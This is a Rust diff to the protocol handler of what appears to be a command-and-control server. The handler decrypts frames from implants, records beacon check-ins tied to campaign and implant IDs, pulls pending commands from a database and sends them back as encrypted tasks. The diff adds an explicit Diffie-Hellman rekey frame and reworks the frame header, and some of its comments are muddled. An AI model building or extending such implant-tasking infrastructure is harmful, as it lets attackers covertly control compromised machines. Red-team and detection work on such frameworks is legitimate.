@@ -130,89 +130,132 @@ impl ProtocolHandler {
 
             // Minimum length for a valid frame (simplified header + minimum JSON)
             if plaintext.len() >= 28 {
+                let frame_type = plaintext[8];
                 let inner_payload = &plaintext[28..];
 
-                if let Ok(beacon) = serde_json::from_slice::<BeaconData>(inner_payload) {
-                    debug!("Beacon Checkin: {}", beacon.id);
-                    let _ = self.event_tx.send(Event {
-                        id: uuid::Uuid::new_v4().to_string(),
-                        r#type: "beacon_checkin".to_string(),
-                        timestamp: Some(prost_types::Timestamp::from(std::time::SystemTime::now())),
-                        campaign_id: "".to_string(),
-                        implant_id: beacon.id.clone(),
-                        data: std::collections::HashMap::new(),
-                    });
+                if frame_type == 0x06 { // FRAME_REKEY_DH
+                    debug!("Received explicit REKEY_DH frame from {}", src_addr);
+                    session.transport.rekey_dh();
+                    session.packet_count = 0;
+                    session.last_rekey = std::time::SystemTime::now();
+                    debug!("Server session {} rekeyed (DH ratchet)", hex::encode(cid));
 
-                    // Task Delivery - Connect to Database
-                    let implant_uuid = uuid::Uuid::parse_str(&beacon.id).unwrap_or_default();
-                    let pending = if implant_uuid != uuid::Uuid::nil() {
-                        match self.db.get_pending_commands(implant_uuid).await {
-                            Ok(cmds) => cmds,
-                            Err(e) => {
-                                error!("Failed to get pending commands for {}: {}", beacon.id, e);
-                                vec![]
-                            }
-                        }
-                    } else {
-                        vec![]
-                    };
-
-                    let tasks = pending
-                        .into_iter()
-                        .map(|c| BeaconTask {
-                            id: c.id.to_string(),
-                            type_: c.command_type,
-                            payload: String::from_utf8_lossy(c.payload.as_deref().unwrap_or(&[]))
-                                .to_string(),
-                        })
-                        .collect();
-
-                    let resp_json = match serde_json::to_vec(&BeaconResponse { tasks }) {
-                        Ok(json) => json,
-                        Err(e) => {
-                            error!("Failed to serialize beacon response: {}", e);
-                            return None;
-                        }
-                    };
-
-                    // Implement proper Frame construction (28-byte header)
-                    let mut frame = Vec::with_capacity(28 + resp_json.len());
-                    frame.extend_from_slice(b"WRTH");
-                    frame.extend_from_slice(&(resp_json.len() as u32).to_be_bytes());
-                    frame.extend_from_slice(&0u16.to_be_bytes());
-                    frame.extend_from_slice(&0u16.to_be_bytes());
-                    frame.extend_from_slice(&[0u8; 16]);
-                    frame.extend_from_slice(&resp_json);
-
-                    // Rekey Logic: Check if we need to ratchet the sending key
-                    let elapsed = session
-                        .last_rekey
-                        .elapsed()
-                        .unwrap_or(std::time::Duration::from_secs(0));
-                    if session.packet_count >= 1_000_000
-                        || elapsed >= std::time::Duration::from_secs(120)
-                    {
-                        session.transport.rekey_dh();
-                        session.packet_count = 0;
-                        session.last_rekey = std::time::SystemTime::now();
-                        debug!("Session {} rekeyed (DH ratchet)", hex::encode(cid));
-                    }
+                    // Send empty response frame to carry the new DH key in header
+                    // We reuse 0x06 for the response frame type to acknowledge
+                    let mut frame = Vec::with_capacity(28);
+                    frame.extend_from_slice(&0u64.to_be_bytes()); // Nonce placeholder
+                    frame.push(0x06); // FRAME_REKEY_DH
+                    frame.push(0); // flags
+                    frame.extend_from_slice(&0u16.to_be_bytes()); // stream_id
+                    frame.extend_from_slice(&0u32.to_be_bytes()); // sequence
+                    frame.extend_from_slice(&0u64.to_be_bytes()); // offset
+                    frame.extend_from_slice(&0u16.to_be_bytes()); // len
+                    frame.extend_from_slice(&[0u8; 2]); // reserved
 
                     let ciphertext = match session.transport.write_message(&frame) {
                         Ok(ct) => ct,
                         Err(e) => {
-                            error!("Encryption failed for beacon response: {}", e);
+                            error!("Encryption failed for rekey response: {}", e);
                             return None;
                         }
                     };
-
-                    // Increment packet counter
-                    session.packet_count += 1;
 
                     let mut response = Vec::new();
                     response.extend_from_slice(&cid);
                     response.extend_from_slice(&ciphertext);
                     return Some(response);
+                }
+
+                // Default to DATA frame logic if type is DATA (0x01) or fallback
+                // The original code didn't check frame_type, so we preserve that for 0x01 or others for now,
+                // but realistically it should only be 0x01.
+                if frame_type == 0x01 || frame_type == 0x05 { // DATA or MESH_RELAY (though mesh is handled below usually)
+                    // Try to parse as BeaconData
+                    if let Ok(beacon) = serde_json::from_slice::<BeaconData>(inner_payload) {
+                        debug!("Beacon Checkin: {}", beacon.id);
+                        let _ = self.event_tx.send(Event {
+                            id: uuid::Uuid::new_v4().to_string(),
+                            r#type: "beacon_checkin".to_string(),
+                            timestamp: Some(prost_types::Timestamp::from(std::time::SystemTime::now())),
+                            campaign_id: "".to_string(),
+                            implant_id: beacon.id.clone(),
+                            data: std::collections::HashMap::new(),
+                        });
+
+                        // Task Delivery - Connect to Database
+                        let implant_uuid = uuid::Uuid::parse_str(&beacon.id).unwrap_or_default();
+                        let pending = if implant_uuid != uuid::Uuid::nil() {
+                            match self.db.get_pending_commands(implant_uuid).await {
+                                Ok(cmds) => cmds,
+                                Err(e) => {
+                                    error!("Failed to get pending commands for {}: {}", beacon.id, e);
+                                    vec![]
+                                }
+                            }
+                        } else {
+                            vec![]
+                        };
+
+                        let tasks = pending
+                            .into_iter()
+                            .map(|c| BeaconTask {
+                                id: c.id.to_string(),
+                                type_: c.command_type,
+                                payload: String::from_utf8_lossy(c.payload.as_deref().unwrap_or(&[]))
+                                    .to_string(),
+                            })
+                            .collect();
+
+                        let resp_json = match serde_json::to_vec(&BeaconResponse { tasks }) {
+                            Ok(json) => json,
+                            Err(e) => {
+                                error!("Failed to serialize beacon response: {}", e);
+                                return None;
+                            }
+                        };
+
+                        // Implement proper Frame construction (28-byte header)
+                        let mut frame = Vec::with_capacity(28 + resp_json.len());
+                        frame.extend_from_slice(b"WRTH"); // Nonce placeholder (using magic for debug visibility?) Original had b"WRTH"
+                        frame.push(0x01); // FRAME_TYPE_DATA
+                        frame.push(0); // flags
+                        frame.extend_from_slice(&0u16.to_be_bytes()); // stream_id
+                        frame.extend_from_slice(&0u32.to_be_bytes()); // sequence
+                        frame.extend_from_slice(&0u64.to_be_bytes()); // offset
+                        frame.extend_from_slice(&(resp_json.len() as u16).to_be_bytes()); // len
+                        frame.extend_from_slice(&[0u8; 2]); // reserved
+                        frame.extend_from_slice(&resp_json);
+
+                        // Rekey Logic: Check if we need to ratchet the sending key
+                        let elapsed = session
+                            .last_rekey
+                            .elapsed()
+                            .unwrap_or(std::time::Duration::from_secs(0));
+                        if session.packet_count >= 1_000_000
+                            || elapsed >= std::time::Duration::from_secs(120)
+                        {
+                            session.transport.rekey_dh();
+                            session.packet_count = 0;
+                            session.last_rekey = std::time::SystemTime::now();
+                            debug!("Session {} rekeyed (DH ratchet)", hex::encode(cid));
+                        }
+
+                        let ciphertext = match session.transport.write_message(&frame) {
+                            Ok(ct) => ct,
+                            Err(e) => {
+                                error!("Encryption failed for beacon response: {}", e);
+                                return None;
+                            }
+                        };
+
+                        // Increment packet counter
+                        session.packet_count += 1;
+
+                        let mut response = Vec::new();
+                        response.extend_from_slice(&cid);
+                        response.extend_from_slice(&ciphertext);
+                        return Some(response);
+                    }
                 }
             }
         } else if let Some(upstream_cid) = self.session_manager.get_upstream_cid(&cid) {
